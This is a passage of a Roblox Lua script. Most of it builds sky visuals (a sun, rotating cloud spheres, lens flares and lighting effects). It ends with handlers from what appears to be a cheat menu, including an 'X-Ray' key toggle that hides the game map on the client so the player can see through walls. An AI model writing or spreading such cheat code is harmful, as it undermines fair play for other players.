o14.Face = Enum.NormalId.Bottom
o15.Name = "Light"
o15.Parent = o4
o15.Size = UDim2.new(30,0,30,0)
o15.Active = true
o16.Name = "Light"
o16.Parent = o15
o16.Size = UDim2.new(1,0,1,0)
o16.Active = true
o16.BackgroundColor3 = Color3.new(0, 0, 0)
o16.BackgroundTransparency = 1
o16.Image = "http://www.roblox.com/asset/?id=146041045"
o16.ImageColor3 = Color3.new(1, 1, 0.498039)
o17.Name = "Light"
o17.Parent = o4
o17.Size = UDim2.new(15,0,15,0)
o17.Active = true
o18.Name = "Light"
o18.Parent = o17
o18.Size = UDim2.new(1,0,1,0)
o18.Active = true
o18.BackgroundColor3 = Color3.new(0, 0, 0)
o18.BackgroundTransparency = 1
o18.Image = "http://www.roblox.com/asset/?id=146041045"
o19.Name = "The Sun"
o19.Parent = o2
o20.Name = "Earth (clouds)"
o20.Parent = o19
o21.Name = "Earth Clouds"
o21.Parent = o20
o21.Material = Enum.Material.Neon
o21.BrickColor = BrickColor.new("Cyan")
o21.Transparency = 1
o21.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o21.Rotation = Vector3.new(47.1199989, 52.0800018, -80.3499985)
o21.Anchored = true
o21.FormFactor = Enum.FormFactor.Symmetric
o21.Shape = Enum.PartType.Ball
o21.Size = Vector3.new(10, 10, 10)
o21.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, 0.103059724, 0.605818927, 0.78889972, -0.573863387, 0.68402797, -0.45031634, -0.812439561, -0.406311989, 0.418153584)
o21.BottomSurface = Enum.SurfaceType.Smooth
o21.RightSurface = Enum.SurfaceType.Unjoinable
o21.TopSurface = Enum.SurfaceType.Smooth
o21.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o21.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o21.Orientation = Vector3.new(26.7600002, 62.0699997, -39.9900017)
o21.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o22.Parent = o21
o22.Transparency = 0.5
o22.Texture = "http://www.roblox.com/asset/?id=262513588"
o23.Parent = o21
o23.Transparency = 0.5
o23.Texture = "http://www.roblox.com/asset/?id=262513588"
o23.Face = Enum.NormalId.Left
o24.Parent = o21
o24.Transparency = 0.5
o24.Texture = "http://www.roblox.com/asset/?id=262513588"
o24.Face = Enum.NormalId.Top
o25.Parent = o21
o25.Transparency = 0.5
o25.Texture = "http://www.roblox.com/asset/?id=262513588"
o25.Face = Enum.NormalId.Right
o26.Parent = o21
o26.Transparency = 0.5
o26.Texture = "http://www.roblox.com/asset/?id=262513588"
o26.Face = Enum.NormalId.Bottom
o27.Parent = o21
o27.Transparency = 0.5
o27.Texture = "http://www.roblox.com/asset/?id=262513588"
o27.Face = Enum.NormalId.Back
o28.Parent = o21
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o28)
end))
o29.Name = "Earth Clouds"
o29.Parent = o20
o29.Material = Enum.Material.Neon
o29.BrickColor = BrickColor.new("Cyan")
o29.Transparency = 1
o29.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o29.Rotation = Vector3.new(111.57, 38.7799988, -129)
o29.Anchored = true
o29.FormFactor = Enum.FormFactor.Symmetric
o29.Shape = Enum.PartType.Ball
o29.Size = Vector3.new(10, 10, 10)
o29.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, -0.490614682, 0.605821669, 0.626321018, -0.0808455944, 0.684024096, -0.724964261, -0.867618144, -0.406314194, -0.286613822)
o29.BottomSurface = Enum.SurfaceType.Smooth
o29.RightSurface = Enum.SurfaceType.Unjoinable
o29.TopSurface = Enum.SurfaceType.Smooth
o29.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o29.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o29.Orientation = Vector3.new(46.4700012, 114.589996, -6.73999977)
o29.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o30.Parent = o29
o30.Transparency = 0.5
o30.Texture = "http://www.roblox.com/asset/?id=262513588"
o31.Parent = o29
o31.Transparency = 0.5
o31.Texture = "http://www.roblox.com/asset/?id=262513588"
o31.Face = Enum.NormalId.Left
o32.Parent = o29
o32.Transparency = 0.5
o32.Texture = "http://www.roblox.com/asset/?id=262513588"
o32.Face = Enum.NormalId.Top
o33.Parent = o29
o33.Transparency = 0.5
o33.Texture = "http://www.roblox.com/asset/?id=262513588"
o33.Face = Enum.NormalId.Right
o34.Parent = o29
o34.Transparency = 0.5
o34.Texture = "http://www.roblox.com/asset/?id=262513588"
o34.Face = Enum.NormalId.Bottom
o35.Parent = o29
o35.Transparency = 0.5
o35.Texture = "http://www.roblox.com/asset/?id=262513588"
o35.Face = Enum.NormalId.Back
o36.Parent = o29
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o36)
end))
o37.Name = "Earth Clouds"
o37.Parent = o20
o37.Material = Enum.Material.Neon
o37.BrickColor = BrickColor.new("Cyan")
o37.Transparency = 1
o37.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o37.Rotation = Vector3.new(80.5400009, -7.30000019, -119.639999)
o37.Anchored = true
o37.FormFactor = Enum.FormFactor.Symmetric
o37.Shape = Enum.PartType.Ball
o37.Size = Vector3.new(10, 10, 10)
o37.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, -0.490617514, 0.862068772, -0.127013296, -0.0808396041, -0.19016248, -0.978417814, -0.86761713, -0.469761252, 0.162987217)
o37.BottomSurface = Enum.SurfaceType.Smooth
o37.RightSurface = Enum.SurfaceType.Unjoinable
o37.TopSurface = Enum.SurfaceType.Smooth
o37.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o37.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o37.Orientation = Vector3.new(78.0699997, -37.9300003, -156.970001)
o37.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o38.Parent = o37
o38.Transparency = 0.5
o38.Texture = "http://www.roblox.com/asset/?id=262513588"
o39.Parent = o37
o39.Transparency = 0.5
o39.Texture = "http://www.roblox.com/asset/?id=262513588"
o39.Face = Enum.NormalId.Left
o40.Parent = o37
o40.Transparency = 0.5
o40.Texture = "http://www.roblox.com/asset/?id=262513588"
o40.Face = Enum.NormalId.Top
o41.Parent = o37
o41.Transparency = 0.5
o41.Texture = "http://www.roblox.com/asset/?id=262513588"
o41.Face = Enum.NormalId.Right
o42.Parent = o37
o42.Transparency = 0.5
o42.Texture = "http://www.roblox.com/asset/?id=262513588"
o42.Face = Enum.NormalId.Bottom
o43.Parent = o37
o43.Transparency = 0.5
o43.Texture = "http://www.roblox.com/asset/?id=262513588"
o43.Face = Enum.NormalId.Back
o44.Parent = o37
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o44)
end))
o45.Name = "Earth Clouds"
o45.Parent = o20
o45.Material = Enum.Material.Neon
o45.BrickColor = BrickColor.new("Cyan")
o45.Transparency = 1
o45.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o45.Rotation = Vector3.new(80.5400009, -7.30000019, -85.4700012)
o45.Anchored = true
o45.FormFactor = Enum.FormFactor.Symmetric
o45.Shape = Enum.PartType.Ball
o45.Size = Vector3.new(10, 10, 10)
o45.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, 0.0783861056, 0.988798499, -0.127018005, -0.173713461, -0.111913003, -0.978415728, -0.981671572, 0.0987593085, 0.162996083)
o45.BottomSurface = Enum.SurfaceType.Smooth
o45.RightSurface = Enum.SurfaceType.Unjoinable
o45.TopSurface = Enum.SurfaceType.Smooth
o45.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o45.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o45.Orientation = Vector3.new(78.0699997, -37.9300003, -122.790001)
o45.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o46.Parent = o45
o46.Transparency = 0.5
o46.Texture = "http://www.roblox.com/asset/?id=262513588"
o47.Parent = o45
o47.Transparency = 0.5
o47.Texture = "http://www.roblox.com/asset/?id=262513588"
o47.Face = Enum.NormalId.Left
o48.Parent = o45
o48.Transparency = 0.5
o48.Texture = "http://www.roblox.com/asset/?id=262513588"
o48.Face = Enum.NormalId.Top
o49.Parent = o45
o49.Transparency = 0.5
o49.Texture = "http://www.roblox.com/asset/?id=262513588"
o49.Face = Enum.NormalId.Right
o50.Parent = o45
o50.Transparency = 0.5
o50.Texture = "http://www.roblox.com/asset/?id=262513588"
o50.Face = Enum.NormalId.Bottom
o51.Parent = o45
o51.Transparency = 0.5
o51.Texture = "http://www.roblox.com/asset/?id=262513588"
o51.Face = Enum.NormalId.Back
o52.Parent = o45
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o52)
end))
o53.Name = "Earth Clouds"
o53.Parent = o20
o53.Material = Enum.Material.Neon
o53.BrickColor = BrickColor.new("Cyan")
o53.Transparency = 1
o53.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o53.Rotation = Vector3.new(42.3199997, -8.52999973, -90.9300003)
o53.Anchored = true
o53.FormFactor = Enum.FormFactor.Symmetric
o53.Shape = Enum.PartType.Ball
o53.Size = Vector3.new(10, 10, 10)
o53.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, -0.0160772279, 0.988798499, -0.148388326, -0.7376917, -0.111909822, -0.665797174, -0.674945414, 0.0987609848, 0.731228471)
o53.BottomSurface = Enum.SurfaceType.Smooth
o53.RightSurface = Enum.SurfaceType.Unjoinable
o53.TopSurface = Enum.SurfaceType.Smooth
o53.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o53.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o53.Orientation = Vector3.new(41.7400017, -11.4700003, -98.6299973)
o53.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o54.Parent = o53
o54.Transparency = 0.5
o54.Texture = "http://www.roblox.com/asset/?id=262513588"
o55.Parent = o53
o55.Transparency = 0.5
o55.Texture = "http://www.roblox.com/asset/?id=262513588"
o55.Face = Enum.NormalId.Left
o56.Parent = o53
o56.Transparency = 0.5
o56.Texture = "http://www.roblox.com/asset/?id=262513588"
o56.Face = Enum.NormalId.Top
o57.Parent = o53
o57.Transparency = 0.5
o57.Texture = "http://www.roblox.com/asset/?id=262513588"
o57.Face = Enum.NormalId.Right
o58.Parent = o53
o58.Transparency = 0.5
o58.Texture = "http://www.roblox.com/asset/?id=262513588"
o58.Face = Enum.NormalId.Bottom
o59.Parent = o53
o59.Transparency = 0.5
o59.Texture = "http://www.roblox.com/asset/?id=262513588"
o59.Face = Enum.NormalId.Back
o60.Parent = o53
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o60)
end))
o61.Name = "Earth Clouds"
o61.Parent = o20
o61.Material = Enum.Material.Neon
o61.BrickColor = BrickColor.new("Cyan")
o61.Transparency = 1
o61.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o61.Rotation = Vector3.new(40.7599983, -61.4599991, -91.9300003)
o61.Anchored = true
o61.FormFactor = Enum.FormFactor.Symmetric
o61.Shape = Enum.PartType.Ball
o61.Size = Vector3.new(10, 10, 10)
o61.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, -0.0160792489, 0.477454692, -0.878509343, -0.73768872, -0.598766625, -0.311917752, -0.674948633, 0.643051803, 0.361840785)
o61.BottomSurface = Enum.SurfaceType.Smooth
o61.RightSurface = Enum.SurfaceType.Unjoinable
o61.TopSurface = Enum.SurfaceType.Smooth
o61.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o61.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o61.Orientation = Vector3.new(18.1700001, -67.6100006, -129.070007)
o61.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o62.Parent = o61
o62.Transparency = 0.5
o62.Texture = "http://www.roblox.com/asset/?id=262513588"
o63.Parent = o61
o63.Transparency = 0.5
o63.Texture = "http://www.roblox.com/asset/?id=262513588"
o63.Face = Enum.NormalId.Left
o64.Parent = o61
o64.Transparency = 0.5
o64.Texture = "http://www.roblox.com/asset/?id=262513588"
o64.Face = Enum.NormalId.Top
o65.Parent = o61
o65.Transparency = 0.5
o65.Texture = "http://www.roblox.com/asset/?id=262513588"
o65.Face = Enum.NormalId.Right
o66.Parent = o61
o66.Transparency = 0.5
o66.Texture = "http://www.roblox.com/asset/?id=262513588"
o66.Face = Enum.NormalId.Bottom
o67.Parent = o61
o67.Transparency = 0.5
o67.Texture = "http://www.roblox.com/asset/?id=262513588"
o67.Face = Enum.NormalId.Back
o68.Parent = o61
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o68)
end))
o69.Name = "Earth Clouds"
o69.Parent = o20
o69.Material = Enum.Material.Neon
o69.BrickColor = BrickColor.new("Cyan")
o69.Transparency = 1
o69.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o69.Rotation = Vector3.new(160.990005, -27.0400009, -17.0300007)
o69.Anchored = true
o69.FormFactor = Enum.FormFactor.Symmetric
o69.Shape = Enum.PartType.Ball
o69.Size = Vector3.new(10, 10, 10)
o69.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, 0.851630926, 0.260821611, -0.454639196, 0.135240406, -0.947372079, -0.290164828, -0.506393611, 0.185628444, -0.842085302)
o69.BottomSurface = Enum.SurfaceType.Smooth
o69.RightSurface = Enum.SurfaceType.Unjoinable
o69.TopSurface = Enum.SurfaceType.Smooth
o69.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o69.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o69.Orientation = Vector3.new(16.8700008, -151.639999, 171.880005)
o69.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o70.Parent = o69
o70.Transparency = 0.5
o70.Texture = "http://www.roblox.com/asset/?id=262513588"
o71.Parent = o69
o71.Transparency = 0.5
o71.Texture = "http://www.roblox.com/asset/?id=262513588"
o71.Face = Enum.NormalId.Left
o72.Parent = o69
o72.Transparency = 0.5
o72.Texture = "http://www.roblox.com/asset/?id=262513588"
o72.Face = Enum.NormalId.Top
o73.Parent = o69
o73.Transparency = 0.5
o73.Texture = "http://www.roblox.com/asset/?id=262513588"
o73.Face = Enum.NormalId.Right
o74.Parent = o69
o74.Transparency = 0.5
o74.Texture = "http://www.roblox.com/asset/?id=262513588"
o74.Face = Enum.NormalId.Bottom
o75.Parent = o69
o75.Transparency = 0.5
o75.Texture = "http://www.roblox.com/asset/?id=262513588"
o75.Face = Enum.NormalId.Back
o76.Parent = o69
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o76)
end))
o77.Name = "Earth Clouds"
o77.Parent = o20
o77.Material = Enum.Material.Neon
o77.BrickColor = BrickColor.new("Cyan")
o77.Transparency = 1
o77.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o77.Rotation = Vector3.new(160.990005, -27.0400009, -50.8499985)
o77.Anchored = true
o77.FormFactor = Enum.FormFactor.Symmetric
o77.Shape = Enum.PartType.Ball
o77.Size = Vector3.new(10, 10, 10)
o77.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, 0.562275231, 0.690759182, -0.454640508, 0.63973552, -0.711719275, -0.29016155, -0.524008572, -0.127698347, -0.842085779)
o77.BottomSurface = Enum.SurfaceType.Smooth
o77.RightSurface = Enum.SurfaceType.Unjoinable
o77.TopSurface = Enum.SurfaceType.Smooth
o77.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o77.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o77.Orientation = Vector3.new(16.8700008, -151.639999, 138.050003)
o77.Color = Color3.new(0.0156863, 0.686275, 0.92549)
o78.Parent = o77
o78.Transparency = 0.5
o78.Texture = "http://www.roblox.com/asset/?id=262513588"
o79.Parent = o77
o79.Transparency = 0.5
o79.Texture = "http://www.roblox.com/asset/?id=262513588"
o79.Face = Enum.NormalId.Left
o80.Parent = o77
o80.Transparency = 0.5
o80.Texture = "http://www.roblox.com/asset/?id=262513588"
o80.Face = Enum.NormalId.Top
o81.Parent = o77
o81.Transparency = 0.5
o81.Texture = "http://www.roblox.com/asset/?id=262513588"
o81.Face = Enum.NormalId.Right
o82.Parent = o77
o82.Transparency = 0.5
o82.Texture = "http://www.roblox.com/asset/?id=262513588"
o82.Face = Enum.NormalId.Bottom
o83.Parent = o77
o83.Transparency = 0.5
o83.Texture = "http://www.roblox.com/asset/?id=262513588"
o83.Face = Enum.NormalId.Back
o84.Parent = o77
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o84)
end))
o85.Name = "Earth Clouds"
o85.Parent = o20
o85.Material = Enum.Material.Neon
o85.BrickColor = BrickColor.new("Deep orange")
o85.Transparency = 0.69999998807907
o85.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o85.Rotation = Vector3.new(129.809998, 15.5, -54.2999992)
o85.Anchored = true
o85.FormFactor = Enum.FormFactor.Symmetric
o85.Shape = Enum.PartType.Ball
o85.Size = Vector3.new(10, 10, 10)
o85.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, 0.562271833, 0.782603502, 0.267174065, 0.639736235, -0.206923649, -0.740216076, -0.524011433, 0.587124228, -0.617006719)
o85.BottomSurface = Enum.SurfaceType.Smooth
o85.RightSurface = Enum.SurfaceType.Unjoinable
o85.TopSurface = Enum.SurfaceType.Smooth
o85.Color = Color3.new(1, 0.686275, 0)
o85.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o85.Orientation = Vector3.new(47.75, 156.589996, 107.919998)
o85.Color = Color3.new(1, 0.686275, 0)
o86.Parent = o85
o86.Transparency = 0.5
o86.Texture = "http://www.roblox.com/asset/?id=262513588"
o87.Parent = o85
o87.Transparency = 0.5
o87.Texture = "http://www.roblox.com/asset/?id=262513588"
o87.Face = Enum.NormalId.Left
o88.Parent = o85
o88.Transparency = 0.5
o88.Texture = "http://www.roblox.com/asset/?id=262513588"
o88.Face = Enum.NormalId.Top
o89.Parent = o85
o89.Transparency = 0.5
o89.Texture = "http://www.roblox.com/asset/?id=262513588"
o89.Face = Enum.NormalId.Right
o90.Parent = o85
o90.Transparency = 0.5
o90.Texture = "http://www.roblox.com/asset/?id=262513588"
o90.Face = Enum.NormalId.Bottom
o91.Parent = o85
o91.Transparency = 0.5
o91.Texture = "http://www.roblox.com/asset/?id=262513588"
o91.Face = Enum.NormalId.Back
o92.Parent = o85
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .01, 0)
wait(0.05)
end

end,o92)
end))
o93.Parent = o19
o94.Parent = o93
o94.Material = Enum.Material.Neon
o94.BrickColor = BrickColor.new("Institutional white")
o94.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o94.Rotation = Vector3.new(-104.139999, 1.82000005, -180)
o94.Anchored = true
o94.CanCollide = false
o94.FormFactor = Enum.FormFactor.Custom
o94.Size = Vector3.new(9.60000038, 9.60000038, 9.60000038)
o94.CFrame = CFrame.new(-1073.62231, 501.5914, 402.172089, -0.999494553, 2.80211054e-09, 0.0317158215, 0.0307546277, 0.244322553, 0.96920383, -0.00774887577, 0.96969384, -0.244199231)
o94.BottomSurface = Enum.SurfaceType.Smooth
o94.TopSurface = Enum.SurfaceType.Unjoinable
o94.Color = Color3.new(0.972549, 0.972549, 0.972549)
o94.Position = Vector3.new(-1073.62231, 501.5914, 402.172089)
o94.Orientation = Vector3.new(-75.7399979, 172.600006, 7.17000008)
o94.Color = Color3.new(0.972549, 0.972549, 0.972549)
o95.Parent = o94
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, .001, 0)
wait(0.05)
end

end,o95)
end))
o96.Parent = o94
o96.MeshType = Enum.MeshType.Sphere
o97.Name = "Light"
o97.Parent = o94
o97.Size = UDim2.new(150,0,150,0)
o97.Enabled = false
o97.Active = true
o98.Name = "Light"
o98.Parent = o97
o98.Size = UDim2.new(1,0,1,0)
o98.Active = true
o98.BackgroundColor3 = Color3.new(0, 0, 0)
o98.BackgroundTransparency = 1
o98.Image = "http://www.roblox.com/asset/?id=146041045"
o98.ImageColor3 = Color3.new(1, 1, 0.537255)
o99.Name = "Light"
o99.Parent = o94
o99.Size = UDim2.new(100,0,100,0)
o99.Enabled = false
o99.Active = true
o100.Name = "Light"
o100.Parent = o99
o100.Size = UDim2.new(1,0,1,0)
o100.Active = true
o100.BackgroundColor3 = Color3.new(0, 0, 0)
o100.BackgroundTransparency = 1
o100.Image = "http://www.roblox.com/asset/?id=146041045"
o101.Name = "E981'sLensFlare"
o101.Parent = o2
o102.Name = "Biggest2"
o102.Parent = o101
o103.Name = "BillboardGuiAdornee"
o103.Parent = o102
o103.Transparency = 1
o103.Position = Vector3.new(-1073.84888, 501.634369, 402.125214)
o103.Rotation = Vector3.new(0, 90, 0)
o103.Anchored = true
o103.CanCollide = false
o103.Locked = true
o103.FormFactor = Enum.FormFactor.Plate
o103.Size = Vector3.new(1, 0.400000006, 2)
o103.CFrame = CFrame.new(-1073.84888, 501.634369, 402.125214, 0, 0, 1, 0, 1, -0, -1, 0, 0)
o103.BottomSurface = Enum.SurfaceType.Smooth
o103.TopSurface = Enum.SurfaceType.Smooth
o103.Position = Vector3.new(-1073.84888, 501.634369, 402.125214)
o103.Orientation = Vector3.new(0, 90, 0)
o104.Parent = o102
o104.Size = UDim2.new(0,300,0,300)
o104.Adornee = o103
o104.AlwaysOnTop = true
o104.StudsOffset = Vector3.new(0, 0, -500)
o105.Name = "Decal"
o105.Parent = o104
o105.Size = UDim2.new(0,300,0,300)
o105.BackgroundColor3 = Color3.new(0.643137, 0.639216, 0.65098)
o105.BackgroundTransparency = 1
o105.Image = "http://www.roblox.com/asset/?id=109801051"
o105.ImageColor3 = Color3.new(0.992157, 1, 0.831373)
o105.ImageTransparency = 0.5
o106.Name = "Biggest2"
o106.Parent = o101
o107.Name = "BillboardGuiAdornee"
o107.Parent = o106
o107.Transparency = 1
o107.Position = Vector3.new(-1073.84888, 502.032806, 402.125214)
o107.Rotation = Vector3.new(0, 90, 0)
o107.Anchored = true
o107.CanCollide = false
o107.Locked = true
o107.FormFactor = Enum.FormFactor.Plate
o107.Size = Vector3.new(1, 0.400000006, 2)
o107.CFrame = CFrame.new(-1073.84888, 502.032806, 402.125214, 0, 0, 1, 0, 1, -0, -1, 0, 0)
o107.BottomSurface = Enum.SurfaceType.Smooth
o107.TopSurface = Enum.SurfaceType.Smooth
o107.Position = Vector3.new(-1073.84888, 502.032806, 402.125214)
o107.Orientation = Vector3.new(0, 90, 0)
o108.Parent = o106
o108.Size = UDim2.new(0,520,0,520)
o108.Adornee = o107
o108.AlwaysOnTop = true
o108.StudsOffset = Vector3.new(0, 0, -1000)
o109.Name = "Decal"
o109.Parent = o108
o109.Size = UDim2.new(0,520,0,520)
o109.BackgroundColor3 = Color3.new(0.643137, 0.639216, 0.65098)
o109.BackgroundTransparency = 1
o109.Image = "http://www.roblox.com/asset/?id=145152504"
o109.ImageColor3 = Color3.new(0.992157, 1, 0.831373)
o110.Name = "Lens Ring"
o110.Parent = o101
o111.Name = "BillboardGuiAdornee"
o111.Parent = o110
o111.Transparency = 1
o111.Position = Vector3.new(-1073.84888, 502.433197, 402.125214)
o111.Rotation = Vector3.new(0, 90, 0)
o111.Anchored = true
o111.CanCollide = false
o111.Locked = true
o111.FormFactor = Enum.FormFactor.Plate
o111.Size = Vector3.new(1, 0.400000006, 2)
o111.CFrame = CFrame.new(-1073.84888, 502.433197, 402.125214, 0, 0, 1, 0, 1, -0, -1, 0, 0)
o111.BottomSurface = Enum.SurfaceType.Smooth
o111.TopSurface = Enum.SurfaceType.Smooth
o111.Position = Vector3.new(-1073.84888, 502.433197, 402.125214)
o111.Orientation = Vector3.new(0, 90, 0)
o112.Parent = o110
o112.Size = UDim2.new(0,120,0,120)
o112.Adornee = o111
o112.AlwaysOnTop = true
o112.StudsOffset = Vector3.new(0, 0, -50)
o113.Name = "Decal"
o113.Parent = o112
o113.Size = UDim2.new(0,120,0,120)
o113.BackgroundColor3 = Color3.new(0.643137, 0.639216, 0.65098)
o113.BackgroundTransparency = 1
o113.Image = "http://www.roblox.com/asset/?id=109801061"
o113.ImageColor3 = Color3.new(0.992157, 1, 0.831373)
o113.ImageTransparency = 0.5
o114.Name = "Biggest"
o114.Parent = o101
o115.Name = "BillboardGuiAdornee"
o115.Parent = o114
o115.Transparency = 1
o115.Position = Vector3.new(-1073.84888, 500.433197, 402.125214)
o115.Rotation = Vector3.new(0, 90, 0)
o115.Anchored = true
o115.CanCollide = false
o115.Locked = true
o115.FormFactor = Enum.FormFactor.Plate
o115.Size = Vector3.new(1, 0.400000006, 2)
o115.CFrame = CFrame.new(-1073.84888, 500.433197, 402.125214, 0, 0, 1, 0, 1, -0, -1, 0, 0)
o115.BottomSurface = Enum.SurfaceType.Smooth
o115.TopSurface = Enum.SurfaceType.Smooth
o115.Position = Vector3.new(-1073.84888, 500.433197, 402.125214)
o115.Orientation = Vector3.new(0, 90, 0)
o116.Parent = o114
o116.Size = UDim2.new(0,80,0,80)
o116.Adornee = o115
o116.AlwaysOnTop = true
o116.StudsOffset = Vector3.new(0, 0, -25)
o117.Name = "Decal"
o117.Parent = o116
o117.Size = UDim2.new(0,80,0,80)
o117.BackgroundColor3 = Color3.new(0.643137, 0.639216, 0.65098)
o117.BackgroundTransparency = 1
o117.Image = "http://www.roblox.com/asset/?id=109801097"
o117.ImageColor3 = Color3.new(0.992157, 1, 0.831373)
mas.Parent = workspace
mas:MakeJoints()
local mas1 = mas:GetChildren()
for i=1,#mas1 do
	mas1[i].Parent = workspace 
	ypcall(function() mas1[i]:MakeJoints() end)
end
mas:Destroy()
for i=1,#cors do
coroutine.resume(cors[i])
end

cors = {}
mas = Instance.new("Model",game:GetService("Lighting")) 
mas.Name = "CompiledModel"
o2 = Instance.new("BloomEffect")
o3 = Instance.new("BlurEffect")
o4 = Instance.new("ColorCorrectionEffect")
o5 = Instance.new("SunRaysEffect")
o2.Parent = mas
o2.Size = 60
o2.Threshold = 1
o2.Intensity = 0.80000001192093
o3.Parent = mas
o3.Size = 7
o4.Parent = mas
o4.Contrast = 0.52999997138977
o4.Saturation = 0.10000000149012
o4.Brightness = 0.070000000298023
o5.Parent = mas
o5.Intensity = 0.30000001192093
o5.Spread = 100
mas.Parent = workspace
mas:MakeJoints()
local mas1 = mas:GetChildren()
for i=1,#mas1 do
	mas1[i].Parent = game:GetService("Lighting") 
	ypcall(function() mas1[i]:MakeJoints() end)
end
mas:Destroy()
for i=1,#cors do
coroutine.resume(cors[i])
end


game:GetService("Lighting").Ambient = Color3.new(0, 0, 0)
game:GetService("Lighting").Brightness = 1
game:GetService("Lighting").ColorShift_Bottom = Color3.new(0, 0, 0)
game:GetService("Lighting").ColorShift_Top = Color3.new(0, 0, 0)
game:GetService("Lighting").GlobalShadows = true
game:GetService("Lighting").OutdoorAmbient = Color3.new(0.529412, 0.529412, 0.501961)
game:GetService("Lighting").Outlines = true
game:GetService("Lighting").GeographicLatitude = 41.733299255371
game:GetService("Lighting").TimeOfDay = "15:00:00"
game:GetService("Lighting").FogColor = Color3.new(0.75, 0.75, 0.75)
game:GetService("Lighting").FogEnd = 100000
game:GetService("Lighting").FogStart = 0
end)


Xray.MouseButton1Click:connect(function()
	Xray.Text = "X-Ray: ON(X)"
	Xray.TextColor3 = Color3.new(255,255,255)
	Xray.BackgroundTransparency = 0
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local mouse = Players.LocalPlayer:GetMouse()
local a = false

mouse.KeyDown:Connect(function(key)
if key == "x" then
if a == false then
pcall(function() game.Workspace.Map.Parent = ReplicatedStorage end)
if game.Workspace:FindFirstChild('#elta') ~= nil then
game.Workspace:WaitForChild('#elta'):Destroy()
end

local abc = Instance.new('Part', workspace)
abc.Anchored = true
abc.Name = "#elta"
abc.Size = Vector3.new(2048, 1, 2048)
abc.CFrame = CFrame.new(Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y -10, Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)

a = true
elseif a == true then
pcall(function() ReplicatedStorage.Map.Parent = game.Workspace end)
if game.Workspace:FindFirstChild('#elta') ~= nil then
game.Workspace:WaitForChild('#elta'):Destroy()
end
a = false
end
end
end)
end)

Cursor.MouseButton1Click:connect(function()
	Cursor.Text = "Cursor: ON(PERM)"
	Cursor.TextColor3 = Color3.new(255,255,255)
	Cursor.BackgroundTransparency = 0
end)

UpdatesPatches.MouseButton1Click:connect(function()
	UpdateFrame.Visible=true
end)

